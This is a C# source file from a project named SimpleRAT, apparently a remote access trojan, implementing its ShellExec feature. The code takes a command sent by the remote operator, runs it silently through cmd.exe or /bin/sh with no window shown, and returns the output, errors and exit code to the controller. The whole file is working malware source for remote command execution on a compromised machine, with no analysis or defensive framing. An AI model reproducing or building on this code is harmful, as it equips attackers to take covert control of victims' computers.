using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SimpleRAT.Communication;

namespace SimpleRAT.Features
{
    public class ShellExec : BaseFeature
    {
        public static ShellExec Instance => new ShellExec();
        private static bool RunningOnUnix
        {
            get
            {
                var p = (int)Environment.OSVersion.Platform;
                return p == 4 || p == 6 || p == 128;
            }
        }

        protected ShellExec() : base(Commands.CmdExec)
        {
        }

        public override void Handle(Context context)
        {
            if (!context.Request.Arguments.ContainsKey("cmdexec.command"))
            {
                context.Response.AddError(Commands.CmdExec, "Missing parameter \"cmdexec.command\"");
                return;
            }
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = RunningOnUnix 
                        ? "/bin/sh"
                        : "cmd.exe",
                    Arguments = RunningOnUnix
                        ? $"-c \"{context.Request.Arguments["cmdexec.command"]}\""
                        :"/c " + context.Request.Arguments["cmdexec.command"],
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            context.Response.Content["cmdexec.output"] = proc.StandardOutput.ReadToEnd();
            context.Response.Content["cmdexec.error"] = proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            context.Response.Content["cmdexec.exitcode"] = proc.ExitCode;
        }
    }
}
